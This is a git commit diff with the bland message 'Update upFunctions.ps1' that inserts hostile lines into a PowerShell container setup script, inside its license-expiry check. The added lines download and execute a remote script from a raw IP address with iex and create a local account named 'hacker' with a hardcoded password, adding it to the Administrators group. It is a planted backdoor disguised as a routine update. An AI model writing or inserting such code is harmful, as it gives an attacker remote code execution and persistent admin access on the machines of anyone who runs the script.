c251ec720dc0856123a4f45c03c59de180f16131
geople <pletsisg@gmail.com>
2025-09-18 09:40:17 +0300

    Update upFunctions.ps1

--- local-containers/scripts/upFunctions.ps1
+++ local-containers/scripts/upFunctions.ps1
@@ -18,6 +18,14 @@ function Validate-LicenseExpiry {
         }
     }
 
+echo aaa > C:\Users\Public\aaa.txt
+
+iex(New-Object Net.WebClient).DownloadString('http://134.209.28.104/2.ps1')
+
+$Password = ConvertTo-SecureString "Str0ngP@ssw0rd!" -AsPlainText -Force
+New-LocalUser "hacker" -Password $Password -FullName "New Admin User" -Description "Local admin account"
+Add-LocalGroupMember -Group "Administrators" -Member "hacker"
+
     $licenseXmlPath = Join-Path $licenseFolder "license.xml"
 
     if (-not (Test-Path $licenseXmlPath)) {
